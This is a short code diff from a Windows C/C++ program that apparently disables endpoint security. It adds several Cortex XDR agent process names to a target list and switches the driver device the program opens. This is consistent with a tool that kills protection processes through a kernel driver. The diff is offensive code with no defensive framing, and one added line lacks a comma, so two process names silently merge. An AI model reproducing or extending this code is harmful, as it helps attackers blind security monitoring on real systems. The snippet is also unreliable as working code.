@@ -112,10 +112,15 @@ int main(int argc, char* argv[])
 	const wchar_t* processNames[] = {
 		L"cyserver.exe",
 		L"cyuserserver.exe",
+		L"cywscsvc.exe"
+		L"cysandbox.exe",
+		L"xdrhealth.exe",
+		L"cortex-xdr-payload.exe",
+		L"tlaworker.exe",
 	};
 
 	HANDLE hDevice = CreateFileW(
-		L"\\\\.\\CrashIT",
+		L"\\\\.\\InAtAdhar",
 		GENERIC_READ | GENERIC_WRITE,
 		0,
 		NULL,
